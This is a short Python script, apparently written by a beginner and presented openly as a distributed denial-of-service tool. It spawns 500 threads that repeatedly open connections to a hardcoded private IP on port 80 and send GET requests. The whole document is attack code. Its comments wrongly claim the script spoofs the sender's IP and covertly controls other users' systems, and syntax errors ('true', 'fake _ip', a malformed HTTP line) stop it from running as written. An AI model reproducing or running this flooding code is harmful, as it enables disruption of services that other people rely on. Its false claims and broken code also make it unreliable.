''' this is a script  called distributed denial of service which help the ackers to create many requsts and then make other user to control the system using the same script without them knowing '''
import socket
import threading

'''intialize the target'''
target='10.0.0.14'

'''the port of you for http is 80 '''
port=80

'''faking your ip address '''
fake_ip='182.34.22.3'


def attacking():
    while true:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(('GET /'+target+ 'HTTP/.1.1\r\n').encode('ascii'),(target,port))
        s.sendto(('Host :'+ fake _ip + '\r\n \r\n').encode('ascii'),(target,port))
        s.close()
for i in range(500):
    thread=threading.Thread(target=attacking)
    thread.start()
    